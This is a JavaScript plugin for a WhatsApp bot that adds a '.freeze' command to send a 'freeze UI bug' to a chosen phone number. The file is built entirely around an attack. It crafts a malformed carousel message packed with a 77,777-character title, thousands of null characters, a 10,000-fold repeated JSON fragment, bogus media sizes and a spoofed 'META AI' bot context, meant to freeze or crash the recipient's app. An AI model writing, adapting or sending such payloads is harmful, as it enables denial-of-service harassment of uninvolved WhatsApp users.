const { cmd } = require('../inconnuboy');
const crypto = require('crypto');

async function FreezeUi(sock, target) {
    const Node = [
        {
            tag: "bot",
            attrs: {
                biz_bot: "1"
            }
        }
    ];
    
    const ButtonsFreeze = [
        { name: "single_select", buttonParamsJson: "" }
    ];

    for (let i = 0; i < 10; i++) {
        ButtonsFreeze.push(
            { name: "cta_catalog", buttonParamsJson: JSON.stringify({ status: true }) },
            { name: "review_order", buttonParamsJson: JSON.stringify({ status: true }) },
            { name: "review_and_pay", buttonParamsJson: JSON.stringify({ status: true }) }
        );
    }

    const msg = {
        key: { remoteJid: target, fromMe: true, id: Date.now().toString() },
        message: {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                        messageSecret: crypto.randomBytes(32),
                        supportPayload: JSON.stringify({
                            version: 2,
                            is_ai_message: true,
                            should_show_system_message: true,
                            ticket_id: crypto.randomBytes(16)
                        })
                    },
                    interactiveMessage: {
                        contextInfo: {
                            participant: target,
                            mentionedJid: [target],
                            remoteJid: "X",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                        carouselMessage: {
                            messageVersion: 1,
                            cards: [
                                {
                                    header: {
                                        title: "ꦾ".repeat(77777),
                                        hasMediaAttachment: true,
                                        imageMessage: {
                                            url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                                            mimetype: "image/jpeg",
                                            fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                                            fileLength: "9999999999999",
                                            height: 9999,
                                            width: 9999,
                                            mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                                            fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                                            directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                                            mediaKeyTimestamp: "1755254367",
                                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEgEhEBJR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k="
                                        }
                                    },
                                    body: { text: "⌁⃰ཀ" + "\u0000".repeat(5000) },
                                    footer: { text: "" + "\u0000".repeat(5000) },
                                    nativeFlowMessage: {
                                        buttons: ButtonsFreeze,
                                        messageParamsJson: "[{".repeat(10000)
                                    }
                                }
                            ]
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        additionalNodes: Node,
        participant: { jid: target },
    });
    
    console.log(`Success Sending Bug FreezeUiCrL To Target`);
}

cmd({
    pattern: "freeze",
    desc: "Send freeze UI bug to a target",
    category: "bugs",
    react: "❄️",
    filename: __filename
}, async (conn, mek, msg, { from, reply, sender, args }) => {
    try {
        // FIX: Check if args exists and has value
        let target = args && args[0] ? args[0] : null;
        
        // FIX: Check quoted message properly
        if (!target && msg && msg.quoted && msg.quoted.sender) {
            target = msg.quoted.sender;
        }
        
        // FIX: Check if target is valid
        if (!target || target === '') {
            return reply("❌ Please provide a target number or reply to a user's message\n\nExample: .freeze 923001234567");
        }
        
        // FIX: Number formatting with toString() protection
        let cleanNumber = '';
        try {
            // Remove non-digits safely
            cleanNumber = String(target).replace(/[^0-9]/g, '');
            
            // Check if we got a valid number
            if (!cleanNumber || cleanNumber.length < 10) {
                return reply("❌ Invalid phone number! Please provide a valid number.\n\nExample: .freeze 923001234567");
            }
            
            // Add @s.whatsapp.net if not present
            if (!target.includes('@')) {
                target = cleanNumber + '@s.whatsapp.net';
            }
        } catch (err) {
            return reply("❌ Error processing number: " + err.message);
        }
        
        // Send attack
        await FreezeUi(conn, target);
        reply(`✅ Freeze UI attack sent to ${cleanNumber}`);
        
    } catch (error) {
        console.error('Freeze command error:', error);
        reply(`❌ Error: ${error.message || 'Something went wrong'}`);
    }
});
